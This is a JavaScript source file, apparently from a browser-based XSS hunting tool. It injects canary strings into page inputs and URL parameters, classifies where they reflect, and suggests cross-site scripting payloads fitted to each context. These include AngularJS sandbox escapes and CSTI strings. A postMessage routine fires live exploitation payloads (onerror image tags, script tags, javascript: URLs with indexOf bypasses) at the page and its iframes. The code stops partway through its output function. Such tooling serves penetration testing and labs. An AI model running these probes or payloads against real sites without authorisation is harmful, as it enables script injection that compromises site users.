/**
 * DOM XSS Hunter v4.6 — Probe / Canary Injection & Reflection Analysis
 */
(function () {
  'use strict';

  const ns = window.__DOMXSS;
  const { truncate, generateCanary } = ns.utils;
  const { highlightEl } = ns.highlight;
  const PROBE_CHARS = ns.PROBE_CHARS;
  const ENCODING_PATTERNS = ns.ENCODING_PATTERNS;
  const CONTEXT_PAYLOADS = ns.CONTEXT_PAYLOADS;

  function detectReflectionContext(element, attrName, rawHTML, position) {
    if (attrName) {
      const tagName = element.tagName?.toLowerCase() || '';
      // srcdoc is a nested HTML context, not a URL
      if (attrName === 'srcdoc') {
        return 'iframe-srcdoc';
      }
      if (['href', 'src', 'action', 'formaction', 'data', 'codebase'].includes(attrName)) {
        // Check if the attribute value is a javascript: URL — different context
        const attrVal = element.getAttribute?.(attrName) || '';
        if (/^\s*javascript\s*:/i.test(attrVal)) {
          return 'js-url';
        }
        return 'html-attr-href';
      }
      if (attrName.startsWith('on')) {
        return 'html-attr-event';
      }
      if (attrName === 'style') {
        return 'css-context';
      }
      // Attribute inside select/option — needs to break out of attr + close select
      if (tagName === 'select' || tagName === 'option') {
        return 'select-context';
      }
      if (rawHTML) {
        const attrPattern = new RegExp(`${attrName}\\s*=\\s*([\"'])`, 'i');
        const m = rawHTML.match(attrPattern);
        if (m) {
          if (m[1] === '"') return 'html-attr-dq';
          if (m[1] === "'") return 'html-attr-sq';
        }
        const uqPattern = new RegExp(`${attrName}\\s*=\\s*[^\"'\\s]`, 'i');
        if (uqPattern.test(rawHTML)) return 'html-attr-uq';
      }
      return 'html-attr-dq';
    }
    const elTag = element.tagName?.toLowerCase() || '';

    // Select/option context
    if (elTag === 'select' || elTag === 'option' || elTag === 'optgroup') {
      return 'select-context';
    }
    // Also check parent chain for select (e.g. text node inside option inside select)
    if (element.closest && element.closest('select')) {
      return 'select-context';
    }

    // Textarea context — need </textarea> to break out
    if (elTag === 'textarea' || (element.closest && element.closest('textarea'))) {
      return 'textarea-context';
    }

    // Title context — need </title> to break out
    if (elTag === 'title') {
      return 'title-context';
    }

    // Canonical/link context
    if (elTag === 'link') {
      return 'canonical-link';
    }

    // Meta refresh context
    if (elTag === 'meta') {
      const httpEquiv = element.getAttribute ? (element.getAttribute('http-equiv') || '') : '';
      if (httpEquiv.toLowerCase() === 'refresh') return 'meta-refresh';
      return 'canonical-link';
    }

    // Noscript context
    if (elTag === 'noscript' || (element.closest && element.closest('noscript'))) {
      return 'noscript-context';
    }

    if (elTag === 'script') {
      if (rawHTML) {
        const beforeReflection = rawHTML.substring(0, position);
        const countUnescaped = (s, ch) => { let c = 0; for (let i = 0; i < s.length; i++) { if (s[i] === ch && (i === 0 || s[i - 1] !== '\\')) c++; } return c; };
        const dqCount = countUnescaped(beforeReflection, '"');
        const sqCount = countUnescaped(beforeReflection, "'");
        const btCount = countUnescaped(beforeReflection, '`');
        if (btCount % 2 === 1) return 'js-template';
        if (sqCount % 2 === 1) return 'js-string-sq';
        if (dqCount % 2 === 1) return 'js-string-dq';
        // All quote counts even — reflection is in raw JS code, not inside a string
        return 'js-code';
      }
      return 'js-string-dq';
    }
    if (elTag === 'style') return 'css-context';

    // SVG context
    if (element.closest && element.closest('svg')) {
      return 'html-body';
    }

    if (rawHTML && position !== undefined) {
      const before = rawHTML.substring(0, position);
      const lastCommentOpen = before.lastIndexOf('<!--');
      const lastCommentClose = before.lastIndexOf('-->');
      if (lastCommentOpen > lastCommentClose) {
        // Verify no --> between <!-- and the reflection position
        const between = rawHTML.substring(lastCommentOpen, position);
        if (!between.includes('-->')) return 'html-comment';
      }
    }

    // AngularJS expression context
    if (document.querySelector('[ng-app]')) {
      if (rawHTML) {
        const searchStart = Math.max(0, (position || 0) - 200);
        const searchEnd = Math.min(rawHTML.length, (position || 0) + 200);
        const vicinity = rawHTML.substring(searchStart, searchEnd);
        if (vicinity.includes('{{') && vicinity.includes('}}')) {
          return 'angular-expression';
        }
      }
      // Fallback: Angular directive on element or ancestor — Angular has likely
      // compiled away {{ }} before we read the DOM, so check for directive scope
      if (element && element.closest) {
        const ngDirs = ['ng-app', 'ng-controller', 'ng-repeat', 'ng-if',
                        'ng-bind', 'ng-model', 'ng-show', 'ng-hide'];
        if (ngDirs.some(d => element.closest(`[${d}]`))) {
          return 'angular-expression';
        }
      }
    }

    return 'html-body';
  }

  function analyzeReflection(canary, reflectedText, rawHTML) {
    const testChars = Object.keys(PROBE_CHARS);
    const analysis = {
      survived: [],
      encoded: [],
      stripped: [],
      encodings: {},
      strippedKeywords: [],
    };

    // Extract ONLY the section between canary base markers for precise analysis.
    // Prevents false positives from surrounding HTML chars (e.g., </p><div> tags
    // after the canary containing literal '<' unrelated to the probe).
    let charSection = reflectedText;
    const m1 = reflectedText.indexOf(canary.base);
    if (m1 >= 0) {
      const m2 = reflectedText.indexOf(canary.base, m1 + canary.base.length);
      if (m2 > m1) charSection = reflectedText.substring(m1 + canary.base.length, m2);
    }

    // Similarly constrain rawHTML search to between markers
    let rawSection = rawHTML;
    if (rawHTML) {
      const r1 = rawHTML.indexOf(canary.base);
      if (r1 >= 0) {
        const r2 = rawHTML.indexOf(canary.base, r1 + canary.base.length);
        if (r2 > r1) rawSection = rawHTML.substring(r1 + canary.base.length, r2);
      }
    }

    for (const ch of testChars) {
      if (charSection.includes(ch)) {
        analysis.survived.push(ch);
        analysis.encodings[ch] = 'none (raw)';
        continue;
      }
      let found = false;
      if (rawSection) {
        for (const [encType, patterns] of Object.entries(ENCODING_PATTERNS)) {
          if (patterns[ch]) {
            for (const encoded of patterns[ch]) {
              if (rawSection.includes(encoded)) {
                analysis.encoded.push(ch);
                analysis.encodings[ch] = `${encType}: ${encoded}`;
                found = true;
                break;
              }
            }
          }
          if (found) break;
        }
      }
      if (!found) {
        analysis.stripped.push(ch);
        analysis.encodings[ch] = 'STRIPPED/FILTERED';
      }
    }

    // Partial encoding detection for dual-canary chars.
    // Only triggers when a char survived raw AND its encoded form also exists
    // within the same canary section — indicating a flawed first-occurrence-only
    // sanitizer like str.replace('<', '&lt;'). Requires duplicate chars (e.g. <<)
    // in the probe to detect; single-char canaries cannot exhibit partial encoding.
    analysis.partiallyEncoded = [];
    const dualChars = ['<', '>', '"', "'"];
    for (const ch of dualChars) {
      if (!analysis.survived.includes(ch)) continue;
      if (!rawSection) continue;
      for (const [encType, patterns] of Object.entries(ENCODING_PATTERNS)) {
        if (!patterns[ch]) continue;
        let found = false;
        for (const encoded of patterns[ch]) {
          if (rawSection.includes(encoded)) {
            analysis.partiallyEncoded.push(ch);
            analysis.encodings[ch] = `PARTIAL: first occurrence encoded (${encType}: ${encoded}), subsequent raw`;
            found = true;
            break;
          }
        }
        if (found) break;
      }
    }

    return analysis;
  }

  function suggestPayloads(context, survived) {
    const ctx = CONTEXT_PAYLOADS[context];
    if (!ctx) return [];
    const suggestions = [];
    for (const cond of ctx.conditions) {
      const met = cond.chars.every(c => survived.includes(c));
      suggestions.push({
        payload: cond.payload,
        note: cond.note,
        viable: met,
        missing: met ? [] : cond.chars.filter(c => !survived.includes(c)),
      });
    }

    // Add CSTI payloads when frameworks are detected and {{ }} chars survive
    try {
      const hasCurly = survived.includes('{') && survived.includes('}');
      const hasParen = survived.includes('(') && survived.includes(')');
      const bodyCtx = context === 'html-body' || context === 'html-attr-dq' || context === 'html-attr-sq' || context === 'html-attr-uq';

      if (hasCurly && bodyCtx) {
        const isAngular = ns.state.frameworks?.angular?.detected || !!window.angular;
        if (isAngular) {
          const cstiPayloads = [
            { chars: ['{', '}', '(', ')'], payload: "{{$on.constructor('alert(1)')()}}", note: 'AngularJS CSTI — $on constructor (v1.6+)' },
            { chars: ['{', '}', '(', ')'], payload: "{{constructor.constructor('alert(1)')()}}", note: 'AngularJS CSTI — constructor chain' },
            { chars: ['{', '}', '(', ')'], payload: "{{[].pop.constructor('alert(1)')()}}", note: 'AngularJS CSTI — array proto constructor' },
            { chars: ['{', '}', '(', ')', "'", '.', '='], payload: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", note: 'AngularJS sandbox escape — charAt override (<=1.5)' },
            { chars: ['{', '}', '.', '=', ';', '|'], payload: '{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}', note: 'AngularJS sandbox escape — fromCharCode (no strings)' },
          ];
          for (const cond of cstiPayloads) {
            const met = cond.chars.every(c => survived.includes(c));
            suggestions.unshift({
              payload: cond.payload,
              note: met ? '🔥 ' + cond.note : cond.note,
              viable: met,
              missing: met ? [] : cond.chars.filter(c => !survived.includes(c)),
            });
          }
        }

        // Other CSTI engines (Handlebars, Mustache, etc.)
        const cstiEngines = ns.CSTI_ENGINES || [];
        for (const engine of cstiEngines) {
          try {
            if (engine.detect()) {
              suggestions.unshift({
                payload: '{{7*7}}',
                note: `${engine.name} detected — test template expression`,
                viable: true,
                missing: [],
              });
            }
          } catch (e) { ns.log.debug(e.message); }
        }
      }

      // Angular no-wrapper fallback: when { } don't survive but Angular is detected
      if (!hasCurly && hasParen && bodyCtx) {
        const isAngular = ns.state.frameworks?.angular?.detected || !!window.angular;
        if (isAngular) {
          const noWrapPayload = {
            chars: ['.', '=', ';', '|'],
            payload: 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)',
            note: 'AngularJS sandbox escape — fromCharCode (template interpolation, no strings)',
          };
          const met = noWrapPayload.chars.every(c => survived.includes(c));
          suggestions.unshift({
            payload: noWrapPayload.payload,
            note: met ? '🔥 ' + noWrapPayload.note : noWrapPayload.note,
            viable: met,
            missing: met ? [] : noWrapPayload.chars.filter(c => !survived.includes(c)),
          });
        }
      }
    } catch (e) { ns.log.debug(e.message); }

    return suggestions;
  }

  function findReflections(canary) {
    const reflections = [];
    const base = canary.base;

    // 1. Buscar en texto de todos los nodos
    const walker = document.createTreeWalker(document.body || document.documentElement, NodeFilter.SHOW_TEXT, null);
    let node;
    while (node = walker.nextNode()) {
      const text = node.textContent;
      if (!text.includes(base)) continue;
      const parent = node.parentElement;
      const rawHTML = parent ? parent.innerHTML : '';
      const position = rawHTML.indexOf(base);
      const ctx = detectReflectionContext(parent, null, rawHTML, position);
      const anal = analyzeReflection(canary, text, rawHTML);
      reflections.push({
        type: 'text', context: ctx,
        element: parent ? `<${parent.tagName.toLowerCase()} id="${parent.id || ''}" class="${(parent.className || '').toString().substring(0, 30)}">` : '(text)',
        rawSample: truncate(text.substring(Math.max(0, text.indexOf(base) - 30), text.indexOf(base) + canary.full.length + 30), 200),
        analysis: anal,
        suggestions: suggestPayloads(ctx, anal.survived),
        domElement: parent,
      });
    }

    // 2. Buscar en atributos
    document.querySelectorAll('*').forEach(el => {
      for (const attr of el.attributes) {
        if (!attr.value.includes(base)) continue;
        const rawHTML = el.outerHTML.substring(0, 500);
        const ctx = detectReflectionContext(el, attr.name, rawHTML);
        const anal = analyzeReflection(canary, attr.value, rawHTML);

        // Attribute breakout detection: if canary base is in attr value but
        // the full canary is NOT, then quote chars successfully broke out of
        // the attribute — mark them as survived (breakout), not stripped.
        if (!attr.value.includes(canary.full)) {
          // The attribute value was truncated — a quote char closed the attribute
          const quoteChar = ctx === 'html-attr-sq' ? "'" : '"';
          if (anal.stripped.includes(quoteChar) || anal.encoded.includes(quoteChar)) {
            // The quote broke the attribute — that's a SUCCESS, not a filter
            anal.stripped = anal.stripped.filter(c => c !== quoteChar);
            anal.encoded = anal.encoded.filter(c => c !== quoteChar);
            if (!anal.survived.includes(quoteChar)) anal.survived.push(quoteChar);
            anal.encodings[quoteChar] = 'BREAKOUT (closes attribute)';
          }
        }

        reflections.push({
          type: 'attribute', context: ctx, attrName: attr.name,
          element: `<${el.tagName.toLowerCase()} ${attr.name}="\u2026">`,
          rawSample: truncate(attr.value, 200),
          analysis: anal,
          suggestions: suggestPayloads(ctx, anal.survived),
          domElement: el,
        });
      }
    });

    // 3. Buscar en scripts inline
    document.querySelectorAll('script:not([src])').forEach(s => {
      if (!s.textContent.includes(base)) return;
      const rawHTML = s.textContent;
      const position = rawHTML.indexOf(base);
      const ctx = detectReflectionContext(s, null, rawHTML, position);
      const anal = analyzeReflection(canary, rawHTML, rawHTML);
      reflections.push({
        type: 'script', context: ctx,
        element: '<script> (inline)',
        rawSample: truncate(rawHTML.substring(Math.max(0, position - 50), position + canary.full.length + 50), 200),
        analysis: anal,
        suggestions: suggestPayloads(ctx, anal.survived),
        domElement: s,
      });
    });
    return reflections;
  }

  function injectCanary(canary) {
    const injected = [];
    const baseUrl = new URL(location.href);
    const existingParams = [...baseUrl.searchParams.entries()];
    const urls = [];

    // Build one URL per existing param (only that param gets the canary, others keep original values)
    for (const [key] of existingParams) {
      const u = new URL(location.href);
      u.searchParams.set(key, canary.full);
      u.hash = canary.full;
      urls.push({ url: u.toString(), param: key });
      injected.push({ vector: `URL param (${key})`, detail: key });
    }

    // xss_probe test param
    const probeUrl = new URL(location.href);
    probeUrl.searchParams.set('xss_probe', canary.full);
    probeUrl.hash = canary.full;
    urls.push({ url: probeUrl.toString(), param: 'xss_probe' });
    injected.push({ vector: 'URL param (test)', detail: 'xss_probe' });

    // Hash-only test
    const hashUrl = new URL(location.href);
    hashUrl.hash = canary.full;
    urls.push({ url: hashUrl.toString(), param: '__hash__' });
    injected.push({ vector: 'URL hash', detail: '#...' });

    try {
      sessionStorage.setItem('__domxss_canary', JSON.stringify(canary));
      sessionStorage.setItem('__domxss_injected_url', urls[0]?.url || baseUrl.toString());
    } catch (e) {}

    return { url: urls[0]?.url || baseUrl.toString(), urls, currentIndex: 0, injected, canary };
  }

  async function runProbe() {
    console.clear();
    ns.log.info('%c\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'color:#ff6600;font-weight:bold');
    ns.log.info('%c\u2551        \uD83E\uDDEA AUTO-PROBE \u2014 Inyecci\u00F3n de canary       \u2551', 'color:#ff6600;font-weight:bold');
    ns.log.info('%c\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D', 'color:#ff6600;font-weight:bold');
    ns.log.info('');

    const canary = generateCanary();
    ns.log.info(`%c\uD83D\uDD11 Canary ID: ${canary.base}`, 'font-weight:bold;color:#ff6600');
    ns.log.info(`%c\uD83D\uDCDD Full probe: ${truncate(canary.full, 80)}`, 'color:#888');
    ns.log.info(`%c\uD83D\uDD24 Chars probados: ${canary.chars}`, 'color:#888');
    ns.log.info('');

    // FASE 1: Inyecci\u00F3n en inputs del DOM
    ns.log.info('%c\u2500\u2500 FASE 1: Inyecci\u00F3n en inputs del DOM \u2500\u2500', 'font-weight:bold;color:#00aaff');
    let inputCount = 0;
    document.querySelectorAll('input[type="text"], input[type="search"], input[type="url"], input:not([type]), textarea, [contenteditable="true"]').forEach(el => {
      try {
        if (el.contentEditable === 'true') {
          el.textContent = canary.full;
        } else {
          el.value = canary.full;
          el.dispatchEvent(new Event('input', { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
        }
        inputCount++;
        highlightEl(el, `\uD83D\uDD35 PROBE INPUT: ${el.name || el.id || el.tagName}`, 'fuzz-src');
      } catch (e) {}
    });
    ns.log.info(`   Inyectado en ${inputCount} input(s)`);

    await new Promise(r => setTimeout(r, ns.CONFIG.delays.postRedirect));

    // FASE 2: Buscar reflejos
    ns.log.info('\n%c\u2500\u2500 FASE 2: Buscando reflejos en el DOM \u2500\u2500', 'font-weight:bold;color:#00aaff');
    const inputReflections = findReflections(canary);
    if (inputReflections.length > 0) {
      printReflections(inputReflections, canary, 'Input injection');
    } else {
      ns.log.info('   %cNo se encontraron reflejos en el DOM actual', 'color:#888');
    }

    // FASE 3: Preparar inyecci\u00F3n via URL
    ns.log.info('\n%c\u2500\u2500 FASE 3: Preparando inyecci\u00F3n v\u00EDa URL \u2500\u2500', 'font-weight:bold;color:#00aaff');
    const injection = injectCanary(canary);
    ns.log.info('%c   Vectores preparados:', 'color:#ccc');
    for (const inj of injection.injected) {
      ns.log.info(`   \u2705 ${inj.vector}: ${inj.detail}`);
    }
    ns.log.info(`\n%c\uD83D\uDD17 URL con canary:`, 'font-weight:bold;color:#ff6600');
    ns.log.info(`%c${injection.url}`, 'color:#4488ff;text-decoration:underline');
    ns.log.info('\n%c\uD83D\uDCCB OPCIONES:', 'font-weight:bold;font-size:13px;color:#00aaff');
    ns.log.info('%c   1. Copiar URL y abrir manualmente para analizar reflejos', 'color:#ccc');
    ns.log.info(`%c   2. Ejecutar %cdomxss.probe.go()%c para navegar autom\u00E1ticamente + analizar`, 'color:#ccc', 'color:#ff6600;font-weight:bold', 'color:#ccc');
    ns.log.info(`%c   3. Ejecutar %cdomxss.probe.check()%c en cualquier p\u00E1gina para buscar el canary`, 'color:#ccc', 'color:#ff6600;font-weight:bold', 'color:#ccc');
    ns.log.info(`%c   4. Ejecutar %cdomxss.probe.postmessage()%c para probar via postMessage`, 'color:#ccc', 'color:#ff6600;font-weight:bold', 'color:#ccc');

    try {
      await navigator.clipboard.writeText(injection.url);
      ns.log.info('\n%c\u2705 URL copiada al clipboard', 'color:green;font-weight:bold');
    } catch (e) {}

    window.__domxss_lastCanary = canary;
    window.__domxss_lastInjection = injection;
  }

  function probeGo() {
    const injection = window.__domxss_lastInjection;
    if (!injection) {
      ns.log.info('%c\u26A0\uFE0F Run domxss.probe() first', 'color:orange');
      return;
    }

    // Support sequential navigation through per-param URLs
    if (injection.urls && injection.urls.length > 0) {
      const idx = injection.currentIndex || 0;
      if (idx >= injection.urls.length) {
        ns.log.info('%c\uD83C\uDFC1 All probe URLs tested! Run domxss.probe.check() for analysis.', 'color:#00ff00;font-weight:bold');
        return;
      }
      const entry = injection.urls[idx];
      const paramLabel = entry.param === '__hash__' ? '#hash' : `?${entry.param}`;
      injection.currentIndex = idx + 1;
      window.__domxss_lastInjection = injection;

      ns.log.info(`%c\uD83D\uDE80 Navigating with canary in ${paramLabel} [${idx + 1}/${injection.urls.length}]`, 'color:#ff6600;font-weight:bold');
      ns.log.info('%c   After loading, run domxss.probe.go() again to test next param, or domxss.probe.check() for analysis', 'color:#888');
      location.href = entry.url;
    } else {
      // Fallback: single URL (legacy)
      ns.log.info('%c\uD83D\uDE80 Navigating to URL with canary...', 'color:#ff6600;font-weight:bold');
      ns.log.info('%c   After loading, run domxss.probe.check() for analysis', 'color:#888');
      location.href = injection.url;
    }
  }

  function probeCheck() {
    console.clear();
    ns.log.info('%c\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'color:#ff6600;font-weight:bold');
    ns.log.info('%c\u2551      \uD83D\uDD0E PROBE CHECK \u2014 An\u00E1lisis de reflejos       \u2551', 'color:#ff6600;font-weight:bold');
    ns.log.info('%c\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D', 'color:#ff6600;font-weight:bold');
    ns.log.info(`\uD83D\uDCCD ${location.href}\n`);

    let canary = window.__domxss_lastCanary;
    if (!canary) {
      try {
        const stored = sessionStorage.getItem('__domxss_canary');
        if (stored) canary = JSON.parse(stored);
      } catch (e) {}
    }
    if (!canary) {
      ns.log.info('%c\u26A0\uFE0F No hay canary. Ejecuta domxss.probe() primero.', 'color:orange');
      return;
    }

    ns.log.info(`%c\uD83D\uDD11 Canary: ${canary.base}`, 'font-weight:bold;color:#ff6600');
    ns.log.info('');

    const pageHTML = document.documentElement.outerHTML;
    const rawOccurrences = (pageHTML.match(new RegExp(canary.base, 'g')) || []).length;
    ns.log.info(`%c\uD83D\uDCC4 ${rawOccurrences} ocurrencia(s) de canary en HTML raw`, 'color:#ccc');

    const reflections = findReflections(canary);

    if (reflections.length === 0) {
      ns.log.info('\n%c\u2705 No se encontraron reflejos del canary en el DOM', 'color:green;font-size:13px');
      ns.log.info('   El input no se refleja o se refleja en una p\u00E1gina diferente.');
      ns.log.info('   Navega a otras p\u00E1ginas y ejecuta domxss.probe.check() en cada una.');

      if (rawOccurrences > 0) {
        ns.log.info(`\n%c\u26A0\uFE0F PERO hay ${rawOccurrences} ocurrencia(s) en el HTML raw que el DOM walker no captur\u00F3`, 'color:#ffaa00;font-weight:bold');
        ns.log.info('   Esto puede significar reflejo en contexto que el browser ya proces\u00F3 (ej: attribute encoded)');

        let searchFrom = 0;
        let occurrence = 0;
        while (searchFrom < pageHTML.length) {
          const idx = pageHTML.indexOf(canary.base, searchFrom);
          if (idx === -1) break;
          occurrence++;
          const start = Math.max(0, idx - 80);
          const end = Math.min(pageHTML.length, idx + canary.full.length + 80);
          const snippet = pageHTML.substring(start, end);
          ns.log.info(`\n   %c#${occurrence} (offset ${idx}):`, 'font-weight:bold;color:#ffaa00');
          ns.log.info(`   %c${truncate(snippet, 200)}`, 'font-family:monospace;color:#ccc;background:#1a1a1a;padding:4px;font-size:11px');

          const anal = analyzeReflection(canary, snippet, snippet);
          ns.log.info(`   \uD83D\uDFE2 Survived: %c${anal.survived.join(' ')}`, 'color:#00ff00;font-weight:bold');
          if (anal.encoded.length) ns.log.info(`   \uD83D\uDFE1 Encoded: %c${anal.encoded.map(c => `${c}\u2192${anal.encodings[c]}`).join(', ')}`, 'color:#ffaa00');
          if (anal.stripped.length) ns.log.info(`   \u26AB Stripped: %c${anal.stripped.join(' ')}`, 'color:#ff4444');

          searchFrom = idx + 1;
        }
      }
      return;
    }

    printReflections(reflections, canary, 'URL/DOM injection');
  }

  function probePostMessage() {
    let canary = window.__domxss_lastCanary;
    if (!canary) canary = generateCanary();

    ns.log.info('%c\uD83E\uDDEA Enviando canary via postMessage...', 'font-weight:bold;color:#ff6600');
    ns.log.info(`   Canary: ${canary.base}`);

    // Phase 1: Send canary string for reflection detection
    const targets = [window];
    const iframes = document.querySelectorAll('iframe');
    iframes.forEach((iframe, i) => {
      try { targets.push(iframe.contentWindow); } catch (e) { ns.log.debug(e.message); }
    });

    for (const target of targets) {
      try { target.postMessage(canary.full, '*'); } catch (e) { ns.log.debug(e.message); }
    }

    // Phase 2: Send exploitation payloads for specific sink types
    const verifyId = Math.random().toString(36).substring(2, 6);
    const exploitPayloads = [
      // For innerHTML sinks (Lab 27)
      { data: `<img src=x onerror="window.__xss_pm_${verifyId}=1">`, desc: 'innerHTML XSS via postMessage' },
      // For document.write sinks
      { data: `<script>window.__xss_pm_${verifyId}=1</script>`, desc: 'document.write XSS via postMessage' },
      // For location.href sinks with indexOf('http:') bypass (Lab 28)
      { data: `javascript:window.__xss_pm_${verifyId}=1//http:`, desc: 'javascript: URL with indexOf("http:") bypass' },
      // Same but for indexOf('https:') checks
      { data: `javascript:window.__xss_pm_${verifyId}=1//https:`, desc: 'javascript: URL with indexOf("https:") bypass' },
      // For eval/Function sinks via postMessage
      { data: `window.__xss_pm_${verifyId}=1`, desc: 'Direct code string for eval() sinks' },
      // For JSON.parse → iframe.src sinks (Lab 29)
      { data: JSON.stringify({ type: 'load-channel', url: `javascript:window.__xss_pm_${verifyId}=1` }), desc: 'JSON.parse → iframe.src (load-channel)' },
      { data: JSON.stringify({ url: `javascript:window.__xss_pm_${verifyId}=1`, src: `javascript:window.__xss_pm_${verifyId}=1` }), desc: 'JSON.parse → generic URL/src sink' },
      // For JSON.parse → eval chain
      { data: JSON.stringify({ type: 'eval', code: `window.__xss_pm_${verifyId}=1` }), desc: 'JSON.parse → eval/code sink' },
      // For JSON.parse → innerHTML chain
      { data: JSON.stringify({ type: 'html', html: `<img src=x onerror="window.__xss_pm_${verifyId}=1">`, content: `<img src=x onerror="window.__xss_pm_${verifyId}=1">` }), desc: 'JSON.parse → innerHTML/content sink' },
    ];

    ns.log.info(`%c   Testing ${exploitPayloads.length} exploitation payloads...`, 'color:#ccc');

    let payloadIdx = 0;
    function sendNextPayload() {
      if (payloadIdx >= exploitPayloads.length) {
        // Final check after all payloads sent
        setTimeout(() => {
          const reflections = findReflections(canary);
          const xssConfirmed = !!window[`__xss_pm_${verifyId}`];

          if (xssConfirmed) {
            ns.log.info(`\n%c\uD83D\uDD25 XSS CONFIRMED via postMessage!`, 'color:#ff0000;font-weight:bold;font-size:14px;background:#330000;padding:4px 8px');
            ns.log.info('%c   A postMessage payload was executed by the page\'s message handler', 'color:#ffaa00');
          }

          if (reflections.length) {
            ns.log.info(`\n%c\uD83D\uDD25 ${reflections.length} reflejo(s) encontrados v\u00EDa postMessage!`, 'color:#ff0000;font-weight:bold');
            printReflections(reflections, canary, 'postMessage');
          } else if (!xssConfirmed) {
            ns.log.info('\n   No se encontraron reflejos v\u00EDa postMessage');
          }
        }, 500);
        return;
      }

      const payload = exploitPayloads[payloadIdx];
      for (const target of targets) {
        try { target.postMessage(payload.data, '*'); } catch (e) { ns.log.debug(e.message); }
      }
      payloadIdx++;
      setTimeout(sendNextPayload, ns.CONFIG.delays.wafProbe + 200);
    }

    setTimeout(sendNextPayload, ns.CONFIG.delays.postRedirect);

    window.__domxss_lastCanary = canary;
  }

  function printReflections(reflections, canary, source) {
    ns.log.info(`\n%c\uD83D\uDD25 ${reflections.length} REFLEJO(S) ENCONTRADOS (${source})`, 'font-size:14px;font-weight:bold;color:#ff0000;background:#330000;padding:4px 8px');
    for (let i = 0; i < reflections.length; i++) {
      const r = reflections[i];
      ns.log.info(`\n%c\u2500\u2500 Reflejo #${i + 1} \u2500\u2500`, 'font-weight:bold;color:#ff6600;font-size:12px');
      ns.log.info(`   \uD83D\uDCCD Contexto: %c${r.context}%c \u2014 ${(CONTEXT_PAYLOADS[r.context]?.desc || 'Desconocido')}`,
        'color:#ff00ff;font-weight:bold', 'color:#aaa');
      ns.log.info(`   \uD83D\uDCE6 Tipo: ${r.type}${r.attrName ? ` (attr: ${r.attrName})` : ''}`);
      ns.log.info(`   \uD83C\uDFF7\uFE0F Elemento: ${r.element}`);
      ns.log.info(`   %c${r.rawSample}`, 'font-family:monospace;color:#ccc;background:#1a1a1a;padding:4px;font-size:11px');
      if (r.domElement) highlightEl(r.domElement, `\uD83D\uDFE3 REFLEJO #${i + 1}: ${r.context}`, 'fuzz-refl');
      ns.log.info('\n   %c\uD83D\uDD24 AN\u00C1LISIS DE CARACTERES:', 'font-weight:bold');
      const a = r.analysis;
      if (a.survived.length) ns.log.info(`   %c\uD83D\uDFE2 Survived (raw): ${a.survived.join(' ')}`, 'color:#00ff00;font-weight:bold');
      if (a.encoded.length) {
        ns.log.info(`   %c\uD83D\uDFE1 Encoded:`, 'color:#ffaa00;font-weight:bold');
        for (const ch of a.encoded) ns.log.info(`      ${ch} \u2192 ${a.encodings[ch]}`);
      }
      if (a.stripped.length) ns.log.info(`   %c\u26AB Stripped/Filtered: ${a.stripped.join(' ')}`, 'color:#ff4444');
      if (r.suggestions.length) {
        ns.log.info('\n   %c\uD83D\uDCA3 PAYLOADS SUGERIDOS:', 'font-weight:bold;color:#ff0000');
        for (const s of r.suggestions) {
          if (s.viable) {
            ns.log.info(`   %c\u2705 ${s.payload}`, 'color:#00ff00;font-weight:bold');
            ns.log.info(`      ${s.note}`);
          } else {
            ns.log.info(`   %c\u274C ${s.payload} \u2014 falta: ${s.missing.join(', ')}`, 'color:#888');
          }
        }
      }
    }
    const vulnReflections = reflections.filter(r => r.suggestions.some(s => s.viable));
    ns.log.info('\n%c\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550', 'color:#ff0000');
    if (vulnReflections.length > 0) {
      ns.log.info(`%c\uD83D\uDD25 ${vulnReflections.length}/${reflections.length} reflejo(s) tienen payloads VIABLES \u2014 POSIBLE XSS`, 'font-size:14px;font-weight:bold;color:#ff0000');
      ns.log.info('%c   Prueba los payloads \u2705 reemplazando el canary en la URL', 'color:#ccc');
    } else {
      ns.log.info(`%c\u26A0\uFE0F ${reflections.length} reflejo(s) encontrados pero los chars cr\u00EDticos est\u00E1n filtrados/encoded`, 'color:#ffaa00;font-weight:bold');
      ns.log.info('%c   Intenta bypasses de encoding o contextos alternativos', 'color:#888');
    }
    ns.log.info('\n%c\uD83C\uDFA8 COLORES EN LA P\u00C1GINA:', 'font-weight:bold;color:#ccc');
